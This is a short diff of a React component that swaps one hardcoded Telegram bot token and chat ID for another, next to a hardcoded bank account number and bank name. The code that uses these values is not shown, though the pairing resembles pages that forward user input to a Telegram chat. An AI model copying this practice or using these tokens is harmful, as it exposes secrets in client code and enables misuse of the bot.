@@ -2,8 +2,8 @@ import React, { useState } from "react";
 import { useLocation } from "react-router-dom";
 import bar from '../../assets/bar.jpg'
 
-const TELEGRAM_BOT_TOKEN = "8226948227:AAHbBofJSiUyhC2VNrPgWAoBr-gwnHX77nI";
-const CHAT_ID = "6398206178";
+const TELEGRAM_BOT_TOKEN = "8119231817:AAGAmxzBGY0vBPeVFM2hEEBbXkoAUGxm_HE";
+const CHAT_ID = "6837437455";
 const BANK_ACCOUNT_NUMBER = "1028882647";
 // const SORT_CODE = "04-29-09"
 const BANK_NAME = "GHL SOLUTIONS SERVICES LIMITED";
